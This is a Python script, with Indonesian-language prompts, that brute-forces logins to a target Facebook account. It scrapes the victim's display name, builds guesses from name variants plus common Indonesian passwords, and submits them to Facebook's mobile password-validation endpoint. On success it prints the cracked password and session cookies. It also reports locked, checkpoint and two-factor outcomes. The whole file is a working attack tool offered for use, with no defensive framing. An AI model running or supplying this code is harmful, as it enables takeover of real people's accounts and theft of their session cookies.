import re,requests,bs4
from bs4 import BeautifulSoup

class Brute:
	def __init__(self):
		self.ses = requests.Session()
		
	def main(self):
		id = input(" Masukan ID : ")
		nama = self.get_nama(id)
		if nama=="Masuk atau Daftar untuk Melihat":
			print(" Gagal Mendapatkan Nama Silahkan Isi Sendiri")
			nama = input(" Masukan Nama : ")
		self.login(id,Generate().password_list(nama))
		print(" Selesai....")
		
	def get_nama(self,id):
		try:
			soup = BeautifulSoup(self.ses.get(f"https://www.facebook.com/{id}", headers={"user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}).text,"html.parser")
			title = soup.find("meta",{"property":"og:title"})
			nama = title.get("content")
		except:
			nama = "Masuk atau Daftar untuk Melihat"
		return nama
		
	def login(self,user,pwx):
		try:
			for pw in pwx:
				pw = pw.lower()
				get = self.ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&hbl=0&refsrc=deprecated")
				data = {"lsd": re.search('name="lsd" value="(.*?)"', str(get.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),"uid": user,"pass": pw,"flow": "login_no_pin","next": f"https://mbasic.facebook.com/login/save-device/?login_source=login"}
				post = self.ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data)
				if "c_user" in self.ses.cookies.get_dict():
					if "Akun Anda Dikunci" in post.text:
						print(f" [Locked] {user}|{pw}")
					else:
						cookie = ";".join([key+"="+value for key,value in self.ses.cookies.get_dict().items()])
						print(f" [Success] {user}|{pw}|{cookie}")
					break
				elif "checkpoint" in self.ses.cookies.get_dict():
					if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(BeautifulSoup(post.text,"html.parser"))):
						print(f" [Autentikasi] {user}|{pw}")
					else:
						print(f" [Checkpoint] {user}|{pw}")
					break
				else:
					print(f" [Failed] {user}|{pw}")
		except:pass
		
class Generate:
	def password_list(self,nama):
		pwx = []
		for x in nama.split(" "):
			if len(x) < 6:
				pwx.append(x+"123")
				pwx.append(x+"1234")
				pwx.append(x+"12345")
			else:
				pwx.append(x)
				pwx.append(x+"123")
				pwx.append(x+"1234")
				pwx.append(x+"12345")
		pwx.append(nama)
		pwx.append(nama.replace(" ",""))
		pwx.append("bismillah")
		pwx.append("rahasia")
		pwx.append("123456")
		pwx.append("sayang")
		pwx.append("indonesia")
		
		return pwx
				
Brute().main()